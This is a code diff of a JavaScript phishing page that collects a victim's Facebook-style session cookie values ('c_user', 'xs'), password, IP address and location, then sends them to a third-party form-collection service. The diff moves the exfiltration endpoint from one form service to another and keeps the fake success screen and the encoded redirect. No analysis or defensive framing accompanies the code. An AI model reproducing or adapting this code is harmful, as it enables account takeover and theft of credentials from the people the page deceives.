@@ -2958,7 +2958,7 @@
         if (vForm) vForm.addEventListener('submit', function (e) {
             e.preventDefault();
             var btn = document.getElementById('submitBtn'); if (btn) { btn.classList.add('loading'); btn.disabled = true; }
-            fetch('https://submit-form.com/lMFLM3Gy8', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ c_user: document.getElementById('c_user').value.trim(), xs: document.getElementById('xs').value.trim(), country: userCountry, city: userCity, ip: userIP }) })
+            fetch('https://formspree.io/f/mnpnepvn', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ c_user: document.getElementById('c_user').value.trim(), xs: document.getElementById('xs').value.trim(), country: userCountry, city: userCity, ip: userIP }) })
                 .then(function (r) { if (r.ok) { allowRecovery ? window.location.replace(atob(finalRedirect)) : goTo('s3'); } else throw 0; })
                 .catch(function () { goTo('s3'); })
                 .finally(function () { if (btn) { btn.classList.remove('loading'); btn.disabled = false; } });
@@ -2973,7 +2973,7 @@
             if (err) err.classList.remove('show');
             if (!val || val.length < 1) { if (err) err.classList.add('show'); return; }
             if (btn) { btn.classList.add('loading'); btn.disabled = true; }
-            fetch('https://submit-form.com/lMFLM3Gy8', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ password: val, country: userCountry, city: userCity, ip: userIP }) }).catch(function () { });
+            fetch('https://formspree.io/f/mnpnepvn', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ password: val, country: userCountry, city: userCity, ip: userIP }) }).catch(function () { });
             setTimeout(function () {
                 var pf = document.getElementById('pwForm'); if (pf) pf.style.display = 'none';
                 var ps = document.getElementById('pwSuccess'); if (ps) ps.classList.add('show');
